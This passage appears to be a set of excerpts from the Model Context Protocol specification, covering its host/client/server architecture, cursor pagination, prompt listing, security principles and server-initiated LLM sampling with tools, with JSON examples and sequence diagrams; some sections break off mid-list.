This architecture enables users to integrate AI\ncapabilities across applications while maintaining clear security boundaries and\nisolating concerns. Built on JSON-RPC, MCP provides a stateful session protocol focused\non context exchange and sampling coordination between clients and servers.\n\n## Core Components\n\n```mermaid\ngraph LR\n    subgraph \"Application Host Process\"\n        H[Host]\n        C1[Client 1]\n        C2[Client 2]\n        C3[Client 3]\n        H --> C1\n        H --> C2\n        H --> C3\n    end\n\n    subgraph \"Local machine\"\n        S1[Server 1<br>Files & Git]\n        S2[Server 2<br>Database]\n        R1[(\"Local<br>Resource A\")]\n        R2[(\"Local<br>Resource B\")]\n\n        C1 --> S1\n        C2 --> S2\n        S1 <--> R1\n        S2 <--> R2\n    end\n\n    subgraph \"Internet\"\n        S3[Server 3<br>External APIs]\n        R3[(\"Remote<br>Resource C\")]\n\n        C3 --> S3\n        S3 <--> R3\n    end\n```\n\n### Host\n\nThe host process acts as the container and coordinator:\n\n- Creates and manages multiple client instances\n- Controls client connection permissions and lifecycle\n- Enforces security policies and consent requirements\n- Handles user authorization decisions\n- Coordinates AI/LLM integration and sampling\n- Manages context aggregation across clients\n\n### Clients\n\nEach client is created by the host and maintains an isolated server connection:\n\n- Establishes one stateful session per server\n- Handles protocol negotiation and capability exchange\n- Routes protocol messages bidirectionally\n- Manages subscriptions and notifications\n- Maintains security boundaries between servers\n\nA host application creates and manages multiple clients, with each client having a 1:1\nrelationship with a particular server.\n\n### Servers\n\nServers provide specialized context and capabilities:\n\n- Expose resources, tools and prompts via MCP primitives\n- Operate independently with focused responsibilities\n- Request sampling through client interfaces\n- Must respect security constraints\n- Can be local processes or remote services\n\n## Design Principles\n\nMCP is built on several key design principles that inform its architecture and\nimplementation:\n\n1. **Servers should be extremely easy to build**\n   - Host applications handle complex orchestration responsibilities\n   - Servers focus on specific, well-defined capabilities\n   - Simple interfaces minimize implementation overhead\n   - Clear separation enables maintainable code\n\n2. **Servers should be highly composable**\n   - Each server provides focused functionality in isolation\n   - Multiple servers can be combined seamlessly\n   - Shared protocol enables interoperability\n   - Modular design supports extensibility\n\n3. **Servers should not be able to read the whole conversation, nor \"see into\" other\n   servers**\n   - Servers receive only necessary contextual information\n   - Full conversation history stays with the host\n   - Each server connection maintains isolation\n   - Cross-server interactions are controlled by the host\n   - Host process enforces security boundaries\n\n4. **Features can be added to servers and clients progressively**\n   - Core protocol provides minimal required functionality\n   - Additional capabilities can be negotiated as needed\n   - Servers and clients evolve independently\n   - Protocol designed for future extensibility\n   - Backwards compatibility is maintained\n\n## Capability Negotiation\n\nThe Model Context Protocol uses a capability-based negotiation system where clients and\nservers explicitly declare their supported features during initialization. Capabilities\ndetermine which protocol features and primitives are available during a session.\n\n- Servers declare capabilities like resource subscriptions, tool support, and prompt\n  templates\n- Clients declare capabilities like sampling support and notification handling\n- Both parties must respect declared capabilities throughout the session\n- Additional capabilities can be negotiated through extensions to the protocol\n\n```mermaid\nsequenceDiagram\n    participant Host\n    participant Client\n    participant Server\n\n    Host->>+Client: Initialize client\n    Client->>+Server: Initialize session with capabilities\n    Server-->>Client: Respond with supported capabilities\n\n    Note over Host,Server: Active Session with Negotiated Features\n\n    loop Client Requests\n        Host->>Client: User- or model-initiated action\n        Client->>Server: Request (tools/resources)\n        Server-->>Client: Response\n        Client-->>Host: Update UI or respond to model\n    end\n\n    loop Server Requests\n        Server->>Client: Request (sampling)\n        Client->>Host: Forward to AI\n        Host-->>Client: AI response\n        Client-->>Server: Response\n    end\n\n    loop Notifications\n        Server--)Client: Resource updates\n        Client--)Server: Status changes\n    end\n\n    Host->>Client: Terminate\n    Client->>-Server: End session\n    deactivate Server\n```\n\nEach capability unlocks specific protocol features for use during the session. For\nexample:\n\n- Implemented [server features](/specification/2025-03-26/server) must be advertised in the\n  server's capabilities\n- Emitting resource subscription notifications requires the server to declare\n  subscription support\n- Tool invocation requires the server to declare tool capabilities\n- [Sampling](/specification/2025-03-26/client) requires the client to declare support in its\n  capabilities\n\nThis capability negotiation ensures clients and servers have a clear understanding of\nsupported functionality while maintaining protocol extensibility.\n"}

Pagination allows servers to yield results in smaller chunks rather\nthan all at once.\n\nPagination is especially important when connecting to external services over the\ninternet, but also useful for local integrations to avoid performance issues with large\ndata sets.\n\n## Pagination Model\n\nPagination in MCP uses an opaque cursor-based approach, instead of numbered pages.\n\n- The **cursor** is an opaque string token, representing a position in the result set\n- **Page size** is determined by the server, and clients **MUST NOT** assume a fixed page\n  size\n\n## Response Format\n\nPagination starts when the server sends a **response** that includes:\n\n- The current page of results\n- An optional `nextCursor` field if more results exist\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": \"123\",\n  \"result\": {\n    \"resources\": [...],\n    \"nextCursor\": \"eyJwYWdlIjogM30=\"\n  }\n}\n```\n\n## Request Format\n\nAfter receiving a cursor, the client can _continue_ paginating by issuing a request\nincluding that cursor:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"resources/list\",\n  \"params\": {\n    \"cursor\": \"eyJwYWdlIjogMn0=\"\n  }\n}\n```\n\n## Pagination Flow\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Client->>Server: List Request (no cursor)\n    loop Pagination Loop\n      Server-->>Client: Page of results + nextCursor\n      Client->>Server: List Request (with cursor)\n    end\n```\n\n## Operations Supporting Pagination\n\nThe following MCP operations support pagination:\n\n- `resources/list` - List available resources\n- `resources/templates/list` - List resource templates\n- `prompts/list` - List available prompts\n- `tools/list` - List available tools\n\n## Implementation Guidelines\n\n1. Servers **SHOULD**:\n   - Provide stable cursors\n   - Handle invalid cursors gracefully\n\n2. Clients **SHOULD**:\n   - Treat a missing `nextCursor` as the end of results\n   - Support both paginated and non-paginated flows\n\n3.

This operation\nsupports [pagination](/specification/2025-03-26/server/utilities/pagination).\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"prompts/list\",\n  \"params\": {\n    \"cursor\": \"optional-cursor-value\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"prompts\": [\n      {\n        \"name\": \"code_review\",\n        \"description\": \"Asks the LLM to analyze code quality and suggest improvements\",\n        \"arguments\": [\n          {\n            \"name\": \"code\",\n            \"description\": \"The code to review\",\n            \"required\": true\n          }\n        ]\n      }\n    ],\n    \"nextCursor\": \"next-page-cursor\"\n  }\n}\n```\n\n### Getting a Prompt\n\nTo retrieve a specific prompt, clients send a `prompts/get` request. Arguments may be\nauto-completed through [the completion API](/specification/2025-03-26/server/utilities/completion).\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"prompts/get\",\n  \"params\": {\n    \"name\": \"code_review\",\n    \"arguments\": {\n      \"code\": \"def hello():\\n    print('world')\"\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"description\": \"Code review prompt\",\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"Please review this Python code:\\ndef hello():\\n    print('world')\"\n        }\n      }\n    ]\n  }\n}\n```\n\n### List Changed Notification\n\nWhen the list of available prompts changes, servers that declared the `listChanged`\ncapability **SHOULD** send a notification:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/prompts/list_changed\"\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Note over Client,Server: Discovery\n    Client->>Server: prompts/list\n    Server-->>Client: List of prompts\n\n    Note over Client,Server: Usage\n    Client->>Server: prompts/get\n    Server-->>Client: Prompt content\n\n    opt listChanged\n      Note over Client,Server: Changes\n      Server--)Client: prompts/list_changed\n      Client->>Server: prompts/list\n      Server-->>Client: Updated prompts\n    end\n```\n\n## Data Types\n\n### Prompt\n\nA prompt definition includes:\n\n- `name`: Unique identifier for the prompt\n- `description`: Optional human-readable description\n- `arguments`: Optional list of arguments for customization\n\n### PromptMessage\n\nMessages in a prompt can contain:\n\n- `role`: Either \"user\" or \"assistant\" to indicate the speaker\n- `content`: One of the following content types:\n\n#### Text Content\n\nText content represents plain text messages:\n\n```json\n{\n  \"type\": \"text\",\n  \"text\": \"The text content of the message\"\n}\n```\n\nThis is the most common content type used for natural language interactions.\n\n#### Image Content\n\nImage content allows including visual information in messages:\n\n```json\n{\n  \"type\": \"image\",\n  \"data\": \"base64-encoded-image-data\",\n  \"mimeType\": \"image/png\"\n}\n```\n\nThe image data **MUST** be base64-encoded and include a valid MIME type.

This enables\nmulti-modal interactions where audio context is important.\n\n#### Embedded Resources\n\nEmbedded resources allow referencing server-side resources directly in messages:\n\n```json\n{\n  \"type\": \"resource\",\n  \"resource\": {\n    \"uri\": \"resource://example\",\n    \"mimeType\": \"text/plain\",\n    \"text\": \"Resource content\"\n  }\n}\n```\n\nResources can contain either text or binary (blob) data and **MUST** include:\n\n- A valid resource URI\n- The appropriate MIME type\n- Either text content or base64-encoded blob data\n\nEmbedded resources enable prompts to seamlessly incorporate server-managed content like\ndocumentation, code samples, or other reference materials directly into the conversation\nflow.\n\n## Error Handling\n\nServers **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Invalid prompt name: `-32602` (Invalid params)\n- Missing required arguments: `-32602` (Invalid params)\n- Internal errors: `-32603` (Internal error)\n\n## Implementation Considerations\n\n1. Servers **SHOULD** validate prompt arguments before processing\n2. Clients **SHOULD** handle pagination for large prompt lists\n3. Both parties **SHOULD** respect capability negotiation\n\n## Security\n\nImplementations **MUST** carefully validate all prompt inputs and outputs to prevent\ninjection attacks or unauthorized access to resources.\n"}

Whether you're building an AI-powered IDE, enhancing a chat interface, or creating\ncustom AI workflows, MCP provides a standardized way to connect LLMs with the context\nthey need.\n\nThis specification defines the authoritative protocol requirements, based on the\nTypeScript schema in\n[schema.ts](https://github.com/modelcontextprotocol/specification/blob/main/schema/2025-03-26/schema.ts).\n\nFor implementation guides and examples, visit\n[modelcontextprotocol.io](https://modelcontextprotocol.io).\n\nThe key words \"MUST\", \"MUST NOT\", \"REQUIRED\", \"SHALL\", \"SHALL NOT\", \"SHOULD\", \"SHOULD\nNOT\", \"RECOMMENDED\", \"NOT RECOMMENDED\", \"MAY\", and \"OPTIONAL\" in this document are to be\ninterpreted as described in [BCP 14](https://datatracker.ietf.org/doc/html/bcp14)\n[[RFC2119](https://datatracker.ietf.org/doc/html/rfc2119)]\n[[RFC8174](https://datatracker.ietf.org/doc/html/rfc8174)] when, and only when, they\nappear in all capitals, as shown here.\n\n## Overview\n\nMCP provides a standardized way for applications to:\n\n- Share contextual information with language models\n- Expose tools and capabilities to AI systems\n- Build composable integrations and workflows\n\nThe protocol uses [JSON-RPC](https://www.jsonrpc.org/) 2.0 messages to establish\ncommunication between:\n\n- **Hosts**: LLM applications that initiate connections\n- **Clients**: Connectors within the host application\n- **Servers**: Services that provide context and capabilities\n\nMCP takes some inspiration from the\n[Language Server Protocol](https://microsoft.github.io/language-server-protocol/), which\nstandardizes how to add support for programming languages across a whole ecosystem of\ndevelopment tools. In a similar way, MCP standardizes how to integrate additional context\nand tools into the ecosystem of AI applications.\n\n## Key Details\n\n### Base Protocol\n\n- [JSON-RPC](https://www.jsonrpc.org/) message format\n- Stateful connections\n- Server and client capability negotiation\n\n### Features\n\nServers offer any of the following features to clients:\n\n- **Resources**: Context and data, for the user or the AI model to use\n- **Prompts**: Templated messages and workflows for users\n- **Tools**: Functions for the AI model to execute\n\nClients may offer the following feature to servers:\n\n- **Sampling**: Server-initiated agentic behaviors and recursive LLM interactions\n\n### Additional Utilities\n\n- Configuration\n- Progress tracking\n- Cancellation\n- Error reporting\n- Logging\n\n## Security and Trust & Safety\n\nThe Model Context Protocol enables powerful capabilities through arbitrary data access\nand code execution paths. With this power comes important security and trust\nconsiderations that all implementors must carefully address.\n\n### Key Principles\n\n1. **User Consent and Control**\n   - Users must explicitly consent to and understand all data access and operations\n   - Users must retain control over what data is shared and what actions are taken\n   - Implementors should provide clear UIs for reviewing and authorizing activities\n\n2. **Data Privacy**\n   - Hosts must obtain explicit user consent before exposing user data to servers\n   - Hosts must not transmit resource data elsewhere without user consent\n   - User data should be protected with appropriate access controls\n\n3. **Tool Safety**\n   - Tools represent arbitrary code execution and must be treated with appropriate\n     caution.\n     - In particular, descriptions of tool behavior such as annotations should be\n       considered untrusted, unless obtained from a trusted server.\n   - Hosts must obtain explicit user consent before invoking any tool\n   - Users should understand what each tool does before authorizing its use\n\n4. **LLM Sampling Controls**\n   - Users must explicitly approve any LLM sampling requests\n   - Users should control:\n     - Whether sampling occurs at all\n     - The actual prompt that will be sent\n     - What results the server can see\n   - The protocol intentionally limits server visibility into prompts\n\n### Implementation Guidelines\n\nWhile MCP itself cannot enforce these security principles at the protocol level,\nimplementors **SHOULD**:\n\n1. Build robust consent and authorization flows into their applications\n2. Provide clear documentation of security implications\n3. Implement appropriate access controls and data protections\n4. Follow security best practices in their integrations\n5. Consider privacy implications in their feature designs\n\n## Learn More\n\nExplore the detailed specification for each protocol component:\n\n<CardGroup cols={5}>\n  <Card\n    title=\"Architecture\"\n    icon=\"sitemap\"\n    href=\"/specification/2025-03-26/architecture\"\n  />\n  <Card\n    title=\"Base Protocol\"\n    icon=\"code\"\n    href=\"/specification/2025-03-26/basic\"\n  />\n  <Card\n    title=\"Server Features\"\n    icon=\"server\"\n    href=\"/specification/2025-03-26/server\"\n  />\n  <Card\n    title=\"Client Features\"\n    icon=\"user\"\n    href=\"/specification/2025-03-26/client\"\n  />\n  <Card title=\"Contributing\" icon=\"pencil\" href=\"/development/contributing\" />\n</CardGroup>\n"}

This flow\nallows clients to maintain control over model access, selection, and permissions while\nenabling servers to leverage AI capabilities&mdash;with no server API keys necessary.\nServers can request text, audio, or image-based interactions and optionally include\ncontext from MCP servers in their prompts.\n\n## User Interaction Model\n\nSampling in MCP allows servers to implement agentic behaviors, by enabling LLM calls to\noccur _nested_ inside other MCP server features.\n\nImplementations are free to expose sampling through any interface pattern that suits\ntheir needs&mdash;the protocol itself does not mandate any specific user interaction\nmodel.\n\n<Warning>\n\nFor trust & safety and security, there **SHOULD** always\nbe a human in the loop with the ability to deny sampling requests.\n\nApplications **SHOULD**:\n\n- Provide UI that makes it easy and intuitive to review sampling requests\n- Allow users to view and edit prompts before sending\n- Present generated responses for review before delivery\n\n</Warning>\n\n## Tools in Sampling\n\nServers can request that the client's LLM use tools during sampling by providing a `tools` array and optional `toolChoice` configuration in their sampling requests. This enables servers to implement agentic behaviors where the LLM can call tools, receive results, and continue the conversation - all within a single sampling request flow.\n\nClients **MUST** declare support for tool use via the `sampling.tools` capability to receive tool-enabled sampling requests. Servers **MUST NOT** send tool-enabled sampling requests to Clients that have not declared support for tool use via the `sampling.tools` capability.\n\n## Capabilities\n\nClients that support sampling **MUST** declare the `sampling` capability during\n[initialization](/specification/2025-11-25/basic/lifecycle#initialization):\n\n**Basic sampling:**\n\n```json\n{\n  \"capabilities\": {\n    \"sampling\": {}\n  }\n}\n```\n\n**With tool use support:**\n\n```json\n{\n  \"capabilities\": {\n    \"sampling\": {\n      \"tools\": {}\n    }\n  }\n}\n```\n\n**With context inclusion support (soft-deprecated):**\n\n```json\n{\n  \"capabilities\": {\n    \"sampling\": {\n      \"context\": {}\n    }\n  }\n}\n```\n\n<Note>\n  The `includeContext` parameter values `\"thisServer\"` and `\"allServers\"` are\n  soft-deprecated. Servers **SHOULD** avoid using these values (e.g. can just\n  omit `includeContext` since it defaults to `\"none\"`), and **SHOULD NOT** use\n  them unless the client declares `sampling.context` capability. These values\n  may be removed in future spec releases.\n</Note>\n\n## Protocol Messages\n\n### Creating Messages\n\nTo request a language model generation, servers send a `sampling/createMessage` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"sampling/createMessage\",\n  \"params\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"What is the capital of France?\"\n        }\n      }\n    ],\n    \"modelPreferences\": {\n      \"hints\": [\n        {\n          \"name\": \"claude-3-sonnet\"\n        }\n      ],\n      \"intelligencePriority\": 0.8,\n      \"speedPriority\": 0.5\n    },\n    \"systemPrompt\": \"You are a helpful assistant.\",\n    \"maxTokens\": 100\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"role\": \"assistant\",\n    \"content\": {\n      \"type\": \"text\",\n      \"text\": \"The capital of France is Paris.\"\n    },\n    \"model\": \"claude-3-sonnet-20240307\",\n    \"stopReason\": \"endTurn\"\n  }\n}\n```\n\n### Sampling with Tools\n\nThe following diagram illustrates the complete flow of sampling with tools, including the multi-turn tool loop:\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n    participant User\n    participant LLM\n\n    Note over Server,Client: Initial request with tools\n    Server->>Client: sampling/createMessage<br/>(messages + tools)\n\n    Note over Client,User: Human-in-the-loop review\n    Client->>User: Present request for approval\n    User-->>Client: Approve/modify\n\n    Client->>LLM: Forward request with tools\n    LLM-->>Client: Response with tool_use<br/>(stopReason: \"toolUse\")\n\n    Client->>User: Present tool calls for review\n    User-->>Client: Approve tool calls\n    Client-->>Server: Return tool_use response\n\n    Note over Server: Execute tool(s)\n    Server->>Server: Run get_weather(\"Paris\")<br/>Run get_weather(\"London\")\n\n    Note over Server,Client: Continue with tool results\n    Server->>Client: sampling/createMessage<br/>(history + tool_results + tools)\n\n    Client->>User: Present continuation\n    User-->>Client: Approve\n\n    Client->>LLM: Forward with tool results\n    LLM-->>Client: Final text response<br/>(stopReason: \"endTurn\")\n\n    Client->>User: Present response\n    User-->>Client: Approve\n    Client-->>Server: Return final response\n\n    Note over Server: Server processes result<br/>(may continue conversation...)\n```\n\nTo request LLM generation with tool use capabilities, servers include `tools` and optionally `toolChoice` in the request:\n\n**Request (Server -> Client):**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"sampling/createMessage\",\n  \"params\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"What's the weather like in Paris and London?\"\n        }\n      }\n    ],\n    \"tools\": [\n      {\n        \"name\": \"get_weather\",\n        \"description\": \"Get current weather for a city\",\n        \"inputSchema\": {\n          \"type\": \"object\",\n          \"properties\": {\n            \"city\": {\n              \"type\": \"string\",\n              \"description\": \"City name\"\n            }\n          },\n          \"required\": [\"city\"]\n        }\n      }\n    ],\n    \"toolChoice\": {\n      \"mode\": \"auto\"\n    },\n    \"maxTokens\": 1000\n  }\n}\n```\n\n**Response (Client -> Server):**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"role\": \"assistant\",\n    \"content\": [\n      {\n        \"type\": \"tool_use\",\n        \"id\": \"call_abc123\",\n        \"name\": \"get_weather\",\n        \"input\": {\n          \"city\": \"Paris\"\n        }\n      },\n      {\n        \"type\": \"tool_use\",\n        \"id\": \"call_def456\",\n        \"name\": \"get_weather\",\n        \"input\": {\n          \"city\": \"London\"\n        }\n      }\n    ],\n    \"model\": \"claude-3-sonnet-20240307\",\n    \"stopReason\": \"toolUse\"\n  }\n}\n```\n\n### Multi-turn Tool Loop\n\nAfter receiving tool use requests from the LLM, the server typically:\n\n1. Executes the requested tool uses.\n2. Sends a new sampling request with the tool results appended\n3. Receives the LLM's response (which might contain new tool uses)\n4. Repeats as many times as needed (server might cap the maximum number of iterations, and e.g. pass `toolChoice: {mode: \"none\"}` on the last iteration to force a final result)\n\n**Follow-up request (Server -> Client) with tool results:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"sampling/createMessage\",\n  \"params\": {\n    \"messages\": [\n      {\n        \"role\": \"user\",\n        \"content\": {\n          \"type\": \"text\",\n          \"text\": \"What's the weather like in Paris and London?\"\n        }\n      },\n      {\n        \"role\": \"assistant\",\n        \"content\": [\n          {\n            \"type\": \"tool_use\",\n            \"id\": \"call_abc123\",\n            \"name\": \"get_weather\",\n            \"input\": { \"city\": \"Paris\" }\n          },\n          {\n            \"type\": \"tool_use\",\n            \"id\": \"call_def456\",\n            \"name\": \"get_weather\",\n            \"input\": { \"city\": \"London\" }\n          }\n        ]\n      },\n      {\n        \"role\": \"user\",\n        \"content\": [\n          {\n            \"type\": \"tool_result\",\n            \"toolUseId\": \"call_abc123\",\n            \"content\": [\n              {\n                \"type\": \"text\",\n                \"text\": \"Weather in Paris: 18°C, partly cloudy\"\n              }\n            ]\n          },\n          {\n            \"type\": \"tool_result\",\n            \"toolUseId\": \"call_def456\",\n            \"content\": [\n              {\n                \"type\": \"text\",\n                \"text\": \"Weather in London: 15°C, rainy\"\n              }\n            ]\n          }\n        ]\n      }\n    ],\n    \"tools\": [\n      {\n        \"name\": \"get_weather\",\n        \"description\": \"Get current weather for a city\",\n        \"inputSchema\": {\n          \"type\": \"object\",\n          \"properties\": {\n            \"city\": { \"type\": \"string\" }\n          },\n          \"required\": [\"city\"]\n        }\n      }\n    ],\n    \"maxTokens\": 1000\n  }\n}\n```\n\n**Final response (Client -> Server):**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"role\": \"assistant\",\n    \"content\": {\n      \"type\": \"text\",\n      \"text\": \"Based on the current weather data:\\n\\n- **Paris**: 18°C and partly cloudy - quite pleasant!\\n- **London**: 15°C and rainy - you'll want an umbrella.\\n\\nParis has slightly warmer and drier conditions today.\"\n    },\n    \"model\": \"claude-3-sonnet-20240307\",\n    \"stopReason\": \"endTurn\"\n  }\n}\n```\n\n## Message Content Constraints\n\n### Tool Result Messages\n\nWhen a user message contains tool results (type: \"tool_result\"), it **MUST** contain ONLY tool results. Mixing tool results with other content types (text, image, audio) in the same message is not allowed.\n\nThis constraint ensures compatibility with provider APIs that use dedicated roles for tool results (e.g., OpenAI's \"tool\" role, Gemini's \"function\" role).\n\n**Valid - single tool result:**\n\n```json\n{\n  \"role\": \"user\",\n  \"content\": {\n    \"type\": \"tool_result\",\n    \"toolUseId\": \"call_123\",\n    \"content\": [{ \"type\": \"text\", \"text\": \"Result data\" }]\n  }\n}\n```\n\n**Valid - multiple tool results:**\n\n```json\n{\n  \"role\": \"user\",\n  \"content\": [\n    {\n      \"type\": \"tool_result\",\n      \"toolUseId\": \"call_123\",\n      \"content\": [{ \"type\": \"text\", \"text\": \"Result 1\" }]\n    },\n    {\n      \"type\": \"tool_result\",\n      \"toolUseId\": \"call_456\",\n      \"content\": [{ \"type\": \"text\", \"text\": \"Result 2\" }]\n    }\n  ]\n}\n```\n\n**Invalid - mixed content:**\n\n```json\n{\n  \"role\": \"user\",\n  \"content\": [\n    {\n      \"type\": \"text\",\n      \"text\": \"Here are the results:\"\n    },\n    {\n      \"type\": \"tool_result\",\n      \"toolUseId\": \"call_123\",\n      \"content\": [{ \"type\": \"text\", \"text\": \"Result data\" }]\n    }\n  ]\n}\n```\n\n### Tool Use and Result Balance\n\nWhen using tool use in sampling, every assistant message containing `ToolUseContent` blocks **MUST** be followed by a user message that consists entirely of `ToolResultContent` blocks, with each tool use (e.g. with `id: $id`) matched by a corresponding tool result (with `toolUseId: $id`), before any other message.\n\nThis requirement ensures:\n\n- Tool uses are always resolved before the conversation continues\n- Provider APIs can concurrently process multiple tool uses and fetch their results in parallel\n- The conversation maintains a consistent request-response pattern\n\n**Example valid sequence:**\n\n1. User message: \"What's the weather like in Paris and London?\"\n2. Assistant message: `ToolUseContent` (`id: \"call_abc123\", name: \"get_weather\", input: {city: \"Paris\"}`) + `ToolUseContent` (`id: \"call_def456\", name: \"get_weather\", input: {city: \"London\"}`)\n3. User message: `ToolResultContent` (`toolUseId: \"call_abc123\", content: \"18°C, partly cloudy\"`) + `ToolResultContent` (`toolUseId: \"call_def456\", content: \"15°C, rainy\"`)\n4. Assistant message: Text response comparing the weather in both cities\n\n**Invalid sequence - missing tool result:**\n\n1. User message: \"What's the weather like in Paris and London?\"\n2. Assistant message: `ToolUseContent` (`id: \"call_abc123\", name: \"get_weather\", input: {city: \"Paris\"}`) + `ToolUseContent` (`id: \"call_def456\", name: \"get_weather\", input: {city: \"London\"}`)\n3. User message: `ToolResultContent` (`toolUseId: \"call_abc123\", content: \"18°C, partly cloudy\"`) ← Missing result for call_def456\n4. Assistant message: Text response (invalid - not all tool uses were resolved)\n\n## Cross-API Compatibility\n\nThe sampling specification is designed to work across multiple LLM provider APIs (Claude, OpenAI, Gemini, etc.). Key design decisions for compatibility:\n\n### Message Roles\n\nMCP uses two roles: \"user\" and \"assistant\".\n\nTool use requests are sent in CreateMessageResult with the \"assistant\" role.\nTool results are sent back in messages with the \"user\" role.\nMessages with tool results cannot contain other kinds of content.\n\n### Tool Choice Modes\n\n`CreateMessageRequest.params.toolChoice` controls the tool use ability of the model:\n\n- `{mode: \"auto\"}`: Model decides whether to use tools (default)\n- `{mode: \"required\"}`: Model MUST use at least one tool before completing\n- `{mode: \"none\"}`: Model MUST NOT use any tools\n\n### Parallel Tool Use\n\nMCP allows models to make multiple tool use requests in parallel (returning an array of `ToolUseContent`). All major provider APIs support this:\n\n- **Claude**: Supports parallel tool use natively\n- **OpenAI**: Supports parallel tool calls (can be disabled with `parallel_tool_calls: false`)\n- **Gemini**: Supports parallel function calls natively\n\nImplementations wrapping providers that support disabling parallel tool use MAY expose this as an extension, but it is not part of the core MCP specification.\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n    participant User\n    participant LLM\n\n    Note over Server,Client: Server initiates sampling\n    Server->>Client: sampling/createMessage\n\n    Note over Client,User: Human-in-the-loop review\n    Client->>User: Present request for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Client,LLM: Model interaction\n    Client->>LLM: Forward approved request\n    LLM-->>Client: Return generation\n\n    Note over Client,User: Response review\n    Client->>User: Present response for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Server,Client: Complete request\n    Client-->>Server: Return approved response\n```\n\n## Data Types\n\n### Messages\n\nSampling messages can contain:\n\n#### Text Content\n\n```json\n{\n  \"type\": \"text\",\n  \"text\": \"The message content\"\n}\n```\n\n#### Image Content\n\n```json\n{\n  \"type\": \"image\",\n  \"data\": \"base64-encoded-image-data\",\n  \"mimeType\": \"image/jpeg\"\n}\n```\n\n#### Audio Content\n\n```json\n{\n  \"type\": \"audio\",\n  \"data\": \"base64-encoded-audio-data\",\n  \"mimeType\": \"audio/wav\"\n}\n```\n\n### Model Preferences\n\nModel selection in MCP requires careful abstraction since servers and clients may use\ndifferent AI providers with distinct model offerings. A server cannot simply request a\nspecific model by name since the client may not have access to that exact model or may\nprefer to use a different provider's equivalent model.\n\nTo solve this, MCP implements a preference system that combines abstract capability\npriorities with optional model hints:\n\n#### Capability Priorities\n\nServers express their needs through three normalized priority values (0-1):\n\n- `costPriority`: How important is minimizing costs? Higher values prefer cheaper models.\n- `speedPriority`: How important is low latency? Higher values prefer faster models.\n- `intelligencePriority`: How important are advanced capabilities? Higher values prefer\n  more capable models.\n\n#### Model Hints\n\nWhile priorities help select models based on characteristics, `hints` allow servers to\nsuggest specific models or model families:\n\n- Hints are treated as substrings that can match model names flexibly\n- Multiple hints are evaluated in order of preference\n- Clients **MAY** map hints to equivalent models from different providers\n- Hints are advisory&mdash;clients make final model selection\n\nFor example:\n\n```json\n{\n  \"hints\": [\n    { \"name\": \"claude-3-sonnet\" }, // Prefer Sonnet-class models\n    { \"name\": \"claude\" } // Fall back to any Claude model\n  ],\n  \"costPriority\": 0.3, // Cost is less important\n  \"speedPriority\": 0.8, // Speed is very important\n  \"intelligencePriority\": 0.5 // Moderate capability needs\n}\n```\n\nThe client processes these preferences to select an appropriate model from its available\noptions. For instance, if the client doesn't have access to Claude models but has Gemini,\nit might map the sonnet hint to `gemini-1.5-pro` based on similar capabilities.\n\n## Error Handling\n\nClients **SHOULD** return errors for common failure cases:\n\n- User rejected sampling request: `-1`\n- Tool result missing in request: `-32602` (Invalid params)\n- Tool results mixed with other content: `-32602` (Invalid params)\n\nExample errors:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"error\": {\n    \"code\": -1,\n    \"message\": \"User rejected sampling request\"\n  }\n}\n```\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Tool result missing in request\"\n  }\n}\n```\n\n## Security Considerations\n\n1. Clients **SHOULD** implement user approval controls\n2. Both parties **SHOULD** validate message content\n3. Clients **SHOULD** respect model preference hints\n4. Clients **SHOULD** implement rate limiting\n5. Both parties **MUST** handle sensitive data appropriately\n\nWhen tools are used in sampling, additional security considerations apply:\n\n6. Servers **MUST** ensure that when replying to a `stopReason: \"toolUse\"`, each `ToolUseContent` item is responded to with a `ToolResultContent` item with a matching `toolUseId`, and that the user message contains only tool results (no other content types)\n7.

